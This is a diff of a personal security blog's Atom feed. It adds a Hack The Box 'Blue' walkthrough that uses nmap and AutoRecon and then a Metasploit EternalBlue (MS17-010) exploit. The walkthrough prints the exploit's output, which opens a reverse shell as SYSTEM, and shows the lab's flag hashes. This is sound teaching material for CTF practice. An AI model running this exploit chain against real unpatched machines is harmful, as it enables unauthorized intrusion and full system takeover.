@@ -1,5 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://hiimzackjones.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://hiimzackjones.github.io/" rel="alternate" type="text/html" /><updated>2020-09-30T23:07:41-04:00</updated><id>http://hiimzackjones.github.io/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
-</subtitle><author><name>Zack Jones</name></author><entry><title type="html">Smbclient Giving Weird Errors - A Fix.</title><link href="http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html" rel="alternate" type="text/html" title="Smbclient Giving Weird Errors - A Fix." /><published>2020-09-30T18:55:00-04:00</published><updated>2020-09-30T18:55:00-04:00</updated><id>http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix</id><content type="html" xml:base="http://hiimzackjones.github.io/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html">&lt;p&gt;So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-14T22:03:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zack Jones</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
+</subtitle><author><name>Zack Jones</name></author><entry><title type="html">Smbclient Giving Weird Errors - A Fix.</title><link href="http://localhost:4000/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html" rel="alternate" type="text/html" title="Smbclient Giving Weird Errors - A Fix." /><published>2020-09-30T18:55:00-04:00</published><updated>2020-09-30T18:55:00-04:00</updated><id>http://localhost:4000/linux/2020/09/30/SMB-Enumeration-Issue-Fix</id><content type="html" xml:base="http://localhost:4000/linux/2020/09/30/SMB-Enumeration-Issue-Fix.html">&lt;p&gt;So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/smbclient.png&quot; alt=&quot;smbclient error&quot; /&gt;&lt;/p&gt;
 
@@ -41,7 +41,7 @@ sudo systemctl restart smb.service
 &lt;p&gt;Okay there ya go. Hope this helps if you’re getting similar NT errors while poking at CTFs or even pentesting!&lt;/p&gt;
 
 &lt;p&gt;Cheers, 
-Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Linux" /><summary type="html">So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.</summary></entry><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://hiimzackjones.github.io/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
+Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Linux" /><summary type="html">So while running through some CTFs I noticed that on almost every machine, if I were enumerating SMB using smbclient, I would get this weird error.</summary></entry><entry><title type="html">Because Resumes Just Aren’t That Good</title><link href="http://localhost:4000/blog/2020/09/03/Because-Resumes.html" rel="alternate" type="text/html" title="Because Resumes Just Aren’t That Good" /><published>2020-09-03T16:30:00-04:00</published><updated>2020-09-03T16:30:00-04:00</updated><id>http://localhost:4000/blog/2020/09/03/Because-Resumes</id><content type="html" xml:base="http://localhost:4000/blog/2020/09/03/Because-Resumes.html">&lt;h1 id=&quot;oh-hello&quot;&gt;Oh.. hello&lt;/h1&gt;
 &lt;p&gt;If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience &lt;a href=&quot;/blog/2020/09/03/Resume.html&quot;&gt;click here&lt;/a&gt;.&lt;/p&gt;
 
 &lt;h1 id=&quot;who-i-am&quot;&gt;Who I am&lt;/h1&gt;
@@ -95,7 +95,216 @@ I also realized that the curriculum was extremely dry for a room of teens hoping
   &lt;li&gt;Google how to enumerate each port you find. Make notes.&lt;/li&gt;
   &lt;li&gt;Write what you’ve done. Take the time to do this. Write the most basic version of what your process was like. A few weeks or months later, go back to edit the notes, forcing you to follow them and re-work the box.&lt;/li&gt;
   &lt;li&gt;Publish things and have a professional critique your process.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Lame HTB Writeup</title><link href="http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup.html" rel="alternate" type="text/html" title="Lame HTB Writeup" /><published>2020-05-17T18:00:00-04:00</published><updated>2020-05-17T18:00:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2020/05/17/Lame-HTB-Writeup.html">&lt;p&gt;Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out &lt;a href=&quot;/infosec/2020/05/15/Legacy-HTB-Writeup.html&quot;&gt;Legacy&lt;/a&gt; first. Feel free to use my writeup for that one as well.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Blog" /><summary type="html">Oh.. hello If you’re looking at this you’ve probably been linked to it via my resume or some other professional network. Thanks for swinging by. Loosen up your tie and grab a drink. This is the official long form of the resume, filling in all the gaps. I hope after reading this I sound like a pretty cool guy and maybe what you’re looking for. If you’re looking to hear about the professional experience click here.</summary></entry><entry><title type="html">Blue HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/20/Blue-HTB-Writeup.html" rel="alternate" type="text/html" title="Blue HTB Writeup" /><published>2020-05-20T18:00:00-04:00</published><updated>2020-05-20T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/20/Blue-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/20/Blue-HTB-Writeup.html">&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/Blue.png&quot; alt=&quot;blue&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hi Hello again. This box is going to be a quick one but a really important one to knock out if you’re looking to learn for the OSCP. You can probably guess what vulnerability we are going to be poking at with this one, but I won’t spoil early. :)&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Usually I post about both nmap and nmapautomator but this round we are going to try a new tool that I’ve heard loads of good things about. This tool has just a massive amount of stuff it does for you and organizes the outputs for you in a file structure that is nifty so. Let’s try that out.&lt;/p&gt;
+
+&lt;h2 id=&quot;autorecon&quot;&gt;AutoRecon&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/AutoReconScreenshot.png&quot; alt=&quot;AutoReconScreen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;First, let’s get an understanding of how this bad boy works. Head over to it’s Github at &lt;a href=&quot;&quot;&gt;&lt;/a&gt; and &lt;a href=&quot;https://github.com/Tib3rius/AutoRecon/blob/master/README.md&quot;&gt;look at the source.&lt;/a&gt; Or not… I’m going to quickly tell you either way.&lt;/p&gt;
+
+&lt;p&gt;Now before you go download it and start using it on pentesting engagements, please know that &lt;strong&gt;it can be noisy&lt;/strong&gt;. It has been designed for CTFs and OSCP like certification stuff.&lt;/p&gt;
+
+&lt;p&gt;Also, it’s basically a script that runs other tools that you most likely would want to run anyway. Here is the list:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;curl&lt;/li&gt;
+  &lt;li&gt;enum4linux&lt;/li&gt;
+  &lt;li&gt;gobuster&lt;/li&gt;
+  &lt;li&gt;nbtscan&lt;/li&gt;
+  &lt;li&gt;nikto&lt;/li&gt;
+  &lt;li&gt;nmap&lt;/li&gt;
+  &lt;li&gt;onesixtyone&lt;/li&gt;
+  &lt;li&gt;oscanner&lt;/li&gt;
+  &lt;li&gt;smbclient&lt;/li&gt;
+  &lt;li&gt;smbmap&lt;/li&gt;
+  &lt;li&gt;smtp-user-enum&lt;/li&gt;
+  &lt;li&gt;snmpwalk&lt;/li&gt;
+  &lt;li&gt;sslscan&lt;/li&gt;
+  &lt;li&gt;svwar&lt;/li&gt;
+  &lt;li&gt;tnscmd10g&lt;/li&gt;
+  &lt;li&gt;whatweb&lt;/li&gt;
+  &lt;li&gt;wkhtmltoimage&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You can imagine how this works. It runs a handful of nmap scans, and based off of what it sees in the scans, it starts using other tools as needed to continue the enumeration. So for example, it sees that port 80 or 443 is open. Then it might run something like dirbuster and nikto against it automatically. This sort of handles the repetitive steps that you do for every machine anyway and gets you right into investigating how to get in, or maybe where to look for further enumeration.&lt;/p&gt;
+
+&lt;p&gt;Now, because it does so much, you can imagine how much data there is to look through. Here is a quick look at the files I got from running it against Blue.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/AutoReconFiles.png&quot; alt=&quot;AutoRecon&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In there you’ve got a list of the commands it ran to get the results, the results of a basic nmap scan, smbclient, enum4linux, etc.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Note: Notice it sets up structure for the rest of your pentest. You have directories to place other notes moving forward. Pretty freaking cool stuff.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So this is what we got to work with for breaking into this bad boy.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;This output is from an nmap scan that goes something like this:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -VV --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.40
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/FullTCPNmapAR.png&quot; alt=&quot;AR Nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is the second half to that.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/FullTCPNmapAR2.png&quot; alt=&quot;AR Nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So what we know is:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Windows 7 Professional 7601 Service Pack 1&lt;/li&gt;
+  &lt;li&gt;Name - haris-PC&lt;/li&gt;
+  &lt;li&gt;SMB message signing default message signing disabled &lt;em&gt;woooo!&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;Ports 139 and 445 &lt;em&gt;oh buddy this looks like smb again&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;smb&quot;&gt;SMB&lt;/h2&gt;
+
+&lt;p&gt;This was some output for the SMBMap it ran. If we didn’t know it was Windows, we sure as heck do now. Lol. Look at all those files we get to see. Kind of silly tbh.&lt;br /&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Blue/SMBMap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The SMBClient seems way less fruitful after seeing the SMBMap results. But here they are.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/SMBClient.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From this we can tell that:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;SMB is wide open it seems.&lt;/li&gt;
+  &lt;li&gt;Big confirm on Windows 7 based off of the files we see in the SMB&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;everything-else&quot;&gt;Everything else&lt;/h2&gt;
+
+&lt;p&gt;There was plenty more but this is the stuff that matters so far. If you’re really curious &lt;a href=&quot;/assets/img/Walkthroughs/Blue/AutoRecon/10.10.10.40&quot;&gt;Here is the complete set of files I got from the AutoRecon&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;yes I know it’s not safe to include files like this, but… the site is purely static and the entire file structure is listed on my github. So. I’m prettty confident that means it’s gucci.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;nmapautomator&quot;&gt;nmapAutomator&lt;/h2&gt;
+&lt;p&gt;Okayyyy okayy. Calm down. I know I lied and said I was just going to use AutoRecon but It’s important to know what you get with each type of automatic scan and what you don’t. And what I didn’t see in AutoRecon was a list of CVEs. I had ran nmapAutomator when breaking into this machine and just happen to have the results saved. So let’s take a look at what we got from the nmapAutomator.&lt;/p&gt;
+
+&lt;p&gt;Almost everything was the same, but I noticed this little tasty note in the nmap vuln scan.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/nmapAutomatorSMBVuln.png&quot; alt=&quot;SMB Vuln&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The takeaway from that screenshot is:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;SMB MS17-010 Vulnerable&lt;/li&gt;
+  &lt;li&gt;CVE-2017-0143 is the CVE for it.&lt;/li&gt;
+  &lt;li&gt;Resource section url says “wannacrypt attack” in the url. &lt;em&gt;freakingg bet&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;investigating-cves&quot;&gt;Investigating CVEs&lt;/h2&gt;
+
+&lt;p&gt;Now we absolutely have enough information to start firing off some hacker magic EternalBlue pew pew. But before we do. Let’s back up. Let’s imagine all you did was a simple nmap and you know it has SMB and it’s Windows 7.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;The first time I broke into this box I didn’t have nmapAutomator or any other special fancy stuff and all I knew was SMB Windows 7 Pro. So let’s just time travel back to that guy.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A simple Google search can help on this. I’m taking time to write this part out because you’re going to run into machines that lack information. Not every vulnerability or CVE is just gonna happily announce itself. Learn to take small chunks of what you know to dig further. So….&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/WindowsSearch.png&quot; alt=&quot;Windows 7 Google&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You already see the first hit is for MS17-010. You also see a Priv Esc for CVE-2019-1132 that would maybe work on this machine as well. The third link is another exploit for EternalBlue. At this point you have enough information to know where to start. Without those big scans, you still have the ability to figure this out. What would the next step be? &lt;strong&gt;Read about the exploits&lt;/strong&gt; not &lt;strong&gt;fire lasers&lt;/strong&gt;. Make sure the exploit makes sense for what you’re using. Doing some reading you’ll find that…&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;EternalBlue does remote code execution.&lt;/li&gt;
+  &lt;li&gt;valid for machines running SMBv1&lt;/li&gt;
+  &lt;li&gt;Works for Windows Vista, Windows 7, and Windows Server 2008 (most versions of these)&lt;/li&gt;
+  &lt;li&gt;Also works on Windows 8, 10, Server 2012 and 2016 if left not updated. But mainly the previously mentioned due to Windows not updating those machines anymore.&lt;/li&gt;
+  &lt;li&gt;It has many CVEs. Basically CVE-2017-0143 to CVE-2017-0148&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;And with that, your brain should go &lt;em&gt;Are we Windows 7…yep…Are we SMBv1….yep&lt;/em&gt; and now is when you start to figure out how to fire it off. Head over to Metasploit.&lt;/p&gt;
+
+&lt;h2 id=&quot;firing-the-lasers-exploitation&quot;&gt;Firing the lasers (Exploitation)&lt;/h2&gt;
+
+&lt;p&gt;Okay. I’m only going to show the Metasploit exploit for this for now. I might add the manual later. You guys remember how this goes?&lt;/p&gt;
+
+&lt;p&gt;Wait wait, before you Metasploit anything let’s just check Searchsploit to see what she says is up.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/SearchSploit.png&quot; alt=&quot;Searchsploit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Wow okay, loads of good stuff there to go from. You could easily read through your options there and figure out how to manually fire this bad boy off. Just remember to read the source code and figure out exactly how to use it first. Oh and what it might do to the machine. &lt;strong&gt;&lt;em&gt;Hint: EternalBlue breaks things sometimes&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Trying to exploit manually? Take a look at AutoBlue ;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Okay let’s see what Metasploit has for us…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/MetaSearch.png&quot; alt=&quot;SearchingMetasploit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Oh heck. It has a EternalBlue scanner??? Well dang, let’s try that puppy out yeah?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/MetasploitScan.png&quot; alt=&quot;scanning with Metasploit module&quot; /&gt;&lt;br /&gt;
+Okay cool. It confirms what we already sort of know. But mainly, it’s good to know this is here.&lt;/p&gt;
+
+&lt;p&gt;Let’s use this one. The other’s seem specific to different things and this is the most generic.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Blue/MetasploitOptions.png&quot; alt=&quot;SettingOptions&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Make sure you check what your IP is. For some reason it defaults to my wlan adapter soo. Check this.&lt;/p&gt;
+
+&lt;p&gt;Alrighty then. Fire this mug off. But know that this exploit is super delicate. It has taken me 3-4 tries before it works in the past. With HTB feel free to at this point just reset the machine if you’re having problems.&lt;/p&gt;
+
+&lt;p&gt;So I couldn’t get a screenshot. The first time I ran this months ago it worked great. While writing this post, I tried it 4 times and it didn’t. So. That’s a thing. Here is the output from the first time I got it to work.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 exploit(windows/smb/ms17_010_eternalblue) &amp;gt; run
+
+[*] Started reverse TCP handler on 10.10.14.17:4444 
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.40:49158) at 2020-05-11 23:56:32 -0400
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&amp;gt; type \Users\haris\Desktop\user.txt
+type \Users\haris\Desktop\user.txt
+4c546aea7dbee75cbd71de245c8deea9
+C:\Windows\system32&amp;gt;type \Users\Administrator\Desktop\root.txt
+type \Users\Administrator\Desktop\root.txt
+ff548eb71e920ff6c08843ce9df4e717
+C:\Windows\system32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;heheheh. Very nice. We are in. And not only that but we are already max priv. The computer is your oyster and you can open it with swords… Wait is that how that saying goes? Shakespeare would hate that I made this joke…&lt;/p&gt;
+
+&lt;p&gt;Okay done and done. Hope this helps!&lt;/p&gt;
+
+&lt;p&gt;Cheers, 
+Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html"></summary></entry><entry><title type="html">Lame HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup.html" rel="alternate" type="text/html" title="Lame HTB Writeup" /><published>2020-05-17T18:00:00-04:00</published><updated>2020-05-17T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/17/Lame-HTB-Writeup.html">&lt;p&gt;Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out &lt;a href=&quot;/infosec/2020/05/15/Legacy-HTB-Writeup.html&quot;&gt;Legacy&lt;/a&gt; first. Feel free to use my writeup for that one as well.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Lame/WebsiteScreenshot.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
@@ -555,7 +764,7 @@ pwd
 &lt;p&gt;Okay well. That’s all I have for this box right now. I might come back and dig into some of this later and add things. Hope this helped and all that jazz.&lt;/p&gt;
 
 &lt;p&gt;Cheers, 
-Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out Legacy first. Feel free to use my writeup for that one as well.</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
+Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Alright let’s talk about Lame for a second. Lame is another great box for practicing for the OSCP. This box is similar to the Legacy box in that it’s pretty easy to hop into. It’s CVE focused and as long as you know how to enumerate, then use tools to search and even Google for the CVEs and vulnerabilities then you should be gucci. If this is your first box that is fine, but I would highly recommend checking out Legacy first. Feel free to use my writeup for that one as well.</summary></entry><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/Website_shot.png&quot; alt=&quot;Website Screenshot&quot; /&gt;&lt;/p&gt;
 
@@ -841,7 +1050,7 @@ meterpreter &amp;gt;
  Email is &lt;strong&gt;hi.imzackjones@gmail.com&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Cheers, 
-Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</summary></entry><entry><title type="html">Necromancer VulnHub Class Exercise</title><link href="http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html" rel="alternate" type="text/html" title="Necromancer VulnHub Class Exercise" /><published>2019-02-02T08:16:00-05:00</published><updated>2019-02-02T08:16:00-05:00</updated><id>http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html">&lt;h2 id=&quot;necromancer-notes&quot;&gt;Necromancer Notes&lt;/h2&gt;
+Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</summary></entry><entry><title type="html">Necromancer VulnHub Class Exercise</title><link href="http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html" rel="alternate" type="text/html" title="Necromancer VulnHub Class Exercise" /><published>2019-02-02T08:16:00-05:00</published><updated>2019-02-02T08:16:00-05:00</updated><id>http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html">&lt;h2 id=&quot;necromancer-notes&quot;&gt;Necromancer Notes&lt;/h2&gt;
 &lt;h5 id=&quot;made-for-intro-for-cyber-security-class-taught-spring-2019&quot;&gt;Made for Intro for Cyber Security Class taught Spring 2019.&lt;/h5&gt;
 
 &lt;p&gt;Necromancer is a CTF that can be downloaded and ran on a virtual environment such as VirtualBox, VMWare, Hyper-V.  &lt;a href=&quot;https://www.vulnhub.com/entry/the-necromancer-1,154/&quot;&gt;https://www.vulnhub.com/entry/the-necromancer-1,154/&lt;/a&gt;&lt;/p&gt;
@@ -959,7 +1168,7 @@ The -sP scan means just pinging machines. Note: Some machines may not respond to
 
 &lt;h4 id=&quot;video-ends-here&quot;&gt;Video ends here.&lt;/h4&gt;
 
-&lt;p&gt;We can assume that the &lt;code&gt;/amagicbridgeappearsatthechasm&lt;/code&gt; is possibly a directory. Try going to the site by typing the host’s IP address and then going to the url. From there use your Web pentesting notes to search through possible directories, check pages that are hidden from Google’s web crawlers, test to see if it’s running off of Wordpress, etc. Take screenshots of your findings.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Necromancer Notes Made for Intro for Cyber Security Class taught Spring 2019.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 2’</title><link href="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 2’" 